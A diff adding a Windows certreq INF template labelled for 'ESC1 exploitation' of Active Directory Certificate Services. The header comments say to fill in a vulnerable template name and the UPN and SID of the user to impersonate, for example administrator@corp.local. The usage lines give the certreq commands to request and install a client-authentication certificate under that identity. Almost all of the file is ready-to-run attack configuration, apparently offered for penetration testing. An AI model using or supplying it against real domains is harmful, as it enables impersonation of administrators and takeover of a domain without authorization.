@@ -1,0 +1,39 @@
+; =============================================================================
+; ESC1-Template.inf — Certificate Request INF for ESC1 Exploitation
+; =============================================================================
+; Replace the placeholders below before running:
+;   <YOUR_USERNAME>  — Your current domain username (the requester, NOT the target)
+;   <TEMPLATE_NAME>  — Vulnerable ESC1 template name (no spaces)
+;   <TARGET_UPN>     — UPN of the user to impersonate (e.g. administrator@corp.local)
+;   <SID_HEX>        — Output from Get-SidExtensionHex.ps1
+;
+; Usage:
+;   certreq -new ESC1.inf ESC1.req
+;   certreq -submit -config "CA_HOST\CA_NAME" ESC1.req ESC1.cer
+;   certreq -accept ESC1.cer
+; =============================================================================
+
+[Version]
+Signature="$Windows NT$"
+
+[NewRequest]
+Subject = "CN=<YOUR_USERNAME>"
+KeySpec = 1
+KeyLength = 2048
+Exportable = TRUE
+MachineKeySet = FALSE
+ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
+ProviderType = 12
+RequestType = PKCS10
+KeyUsage = 0xa0
+
+[RequestAttributes]
+CertificateTemplate = <TEMPLATE_NAME>
+
+[EnhancedKeyUsageExtension]
+OID=1.3.6.1.5.5.7.3.2
+
+[Extensions]
+2.5.29.17 = "{text}"
+_continue_ = "upn=<TARGET_UPN>"
+1.3.6.1.4.1.311.25.2 = "{hex}<SID_HEX>"
